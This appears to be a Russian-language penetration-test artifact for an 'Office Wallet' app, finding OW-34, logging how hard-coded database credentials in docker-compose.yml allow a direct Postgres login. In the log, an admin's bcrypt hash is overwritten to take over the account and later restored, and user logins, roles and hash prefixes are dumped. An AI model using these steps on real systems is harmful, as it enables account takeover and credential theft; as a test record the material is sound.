@@ -1,0 +1,53 @@
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-34
+################################################################################################
+--- проверка 1/2 ---
+== 4. OW-34: смена пароля напрямую в базе ==
+    · Второй способ, вообще без приложений и SMS: пароль БД wallet/wallet лежит в
+    · docker-compose.yml, порт открыт в сети compose (sslmode=disable). Обратного
+    · чтения bcrypt нет, но хеш заменяется на любой. Расширения pgcrypto в базе нет,
+    · поэтому готовый хеш не генерируем, а копируем: ставим жертве пароль, который
+    · мы и так знаем от ivanov.
+    → SQL SELECT password_hash FROM users WHERE login='adminw'
+    ← psql $2a$10$.WcgUxFiEZL4aYQrYr5bLun2/lMFs9Gifu4FENX2Z5AWs1dWOPy0u
+    → SQL UPDATE users SET password_hash=(SELECT password_hash FROM users WHERE login='ivanov') WHERE login='adminw'
+    ← psql UPDATE 1
+    → SQL SELECT password_hash FROM users WHERE login='adminw'
+    ← psql $2a$10$DQdYa8ulSNI7ufNE7g.wIOwauAGuRjefvh4HpI6l5.yBULozjV9uy
+    → POST /login  login=adminw (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    ┌─ АРТЕФАКТ · OW-34 · прямая запись в таблицу пользователей
+    │ hash жертвы изменён: $2a$10$.WcgUxFiEZL… → скопирован hash ivanov=$2a$10$DQdYa8ulSNI…
+    │ POST /login victim/workplace1 → HTTP 302; вход успешен
+    └─
+[+] зашли: adminw / workplace1 — пароль иванова стал паролем админа
+    → SQL UPDATE users SET password_hash='$2a$10$.WcgUxFiEZL4aYQrYr5bLun2/lMFs9Gifu4FENX2Z5AWs1dWOPy0u' WHERE login='adminw'
+    ← psql UPDATE 1
+    → SQL SELECT password_hash FROM users WHERE login='adminw'
+    ← psql $2a$10$.WcgUxFiEZL4aYQrYr5bLun2/lMFs9Gifu4FENX2Z5AWs1dWOPy0u
+    пароль adminw восстановлен: hash совпал=True
+
+--- проверка 2/2 ---
+== 7. OW-34: прямой доступ к базе по паролю из репозитория ==
+    · DSN с паролем wallet/wallet лежит в docker-compose.yml, sslmode=disable,
+    · порт базы открыт в сети compose — подключается любая машина в ней. Приложение
+    · не участвует: можно читать и переписывать всё в обход любого его кода.
+    → psql -h db -U wallet -d wallet   (DSN postgres://wallet:wallet@db:5432/wallet)
+    → SQL SELECT login||' | '||role||' | '||left(password_hash,20)||'...' FROM users ORDER BY id;
+    ← psql ivanov | admin | $2a$10$DQdYa8ulSNI7u...
+    petrova | employee | $2a$10$3yRGTpVXg0YsQ...
+    sidorov | employee | $2a$10$m.GFGJUh6MIMP...
+    kassa | cashier | $2a$10$Zssjo8K34d6Bw...
+    buch | accountant | $2a$10$k2hQU0/WUG56e...
+    adminw | admin | $2a$10$.WcgUxFiEZL4a...
+    ow24test | employee | ...
+    ┌─ АРТЕФАКТ · OW-34 · учётные данные БД дают прямое чтение
+    │ docker exec … psql -U wallet -d wallet → SELECT users
+    │ ivanov | admin | $2a$10$DQdYa8ulSNI7u...
+    │ petrova | employee | $2a$10$3yRGTpVXg0YsQ...
+    │ sidorov | employee | $2a$10$m.GFGJUh6MIMP...
+    │ kassa | cashier | $2a$10$Zssjo8K34d6Bw...
+    │ buch | accountant | $2a$10$k2hQU0/WUG56e...
+    └─
+[+] подключение к БД в обход приложения вернуло строки пользователей
